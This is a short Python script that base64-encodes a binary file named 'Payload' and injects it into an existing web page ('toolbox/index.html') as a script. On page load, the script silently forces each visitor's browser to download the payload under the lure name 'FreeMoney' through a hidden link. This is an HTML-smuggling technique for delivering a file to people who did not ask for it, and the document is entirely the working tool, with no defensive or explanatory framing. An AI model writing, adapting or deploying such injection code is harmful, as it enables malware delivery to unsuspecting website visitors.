import base64
from bs4 import BeautifulSoup

with open("./payload/Payload", "rb") as payload_file:
    binary_data = payload_file.read()
    encoded_data = base64.b64encode(binary_data).decode()

js_script = f"""

    function decodeData(data) {{
        const decoded = window.atob(data)
        const len = decoded.length

        var bytes = new Uint8Array( len );
        for (var i = 0; i < len; i++) {{ bytes[i] = decoded.charCodeAt(i) }}

        return bytes.buffer;
    }}

    const data = decodeData("{encoded_data}")
    const fileName = "FreeMoney"

    const blob = new Blob([data], {{type: 'octet/stream'}})

    if (window.navigator.msSaveOrOpenBlob) {{
        window.navigator.msSaveOrOpenBlob(blob,fileName)
    }} else {{
        const a = document.createElement('a');
        console.log(a);
        document.body.appendChild(a);
        a.style = 'display: none';
        const url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName;
        a.click();
        window.URL.revokeObjectURL(url);
    }}
    console.log(data)
"""

def main():
    with open("toolbox/index.html", "r", encoding="utf-8") as original_file:
        html_content = original_file.read()

    soup = BeautifulSoup(html_content, "html.parser")

    new_script = soup.new_tag("script")
    new_script.string = js_script
    soup.body.append(new_script)

    with open("modified_index.html", "w", encoding="utf-8") as new_file:
        new_file.write(str(soup.prettify()))

if __name__ == "__main__":
    main()
